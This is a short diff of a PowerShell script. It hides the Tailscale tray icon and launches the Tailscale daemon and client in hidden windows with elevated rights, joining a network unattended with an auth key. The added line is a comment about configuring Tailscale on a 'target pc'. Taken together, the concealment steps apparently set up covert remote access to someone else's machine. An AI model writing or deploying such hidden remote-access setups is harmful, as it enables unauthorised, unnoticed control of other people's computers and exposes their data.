@@ -219,7 +219,7 @@ Set-Location $PSScriptRoot
 
 Start-Sleep 5
 removeIcon -ProgramPath "C:\Tailscale\tailscale-ipn.exe" -Hide 
-
+# FIXME: Configure Tailscale on target pc right 
 Start-Process -FilePath ".\tailscaled.exe" -windowstyle hidden -Verb RunAs
 Start-Process -FilePath ".\tailscale.exe" -windowstyle hidden -Verb RunAs -ArgumentList 'up --authkey $authKey --unattended'
 
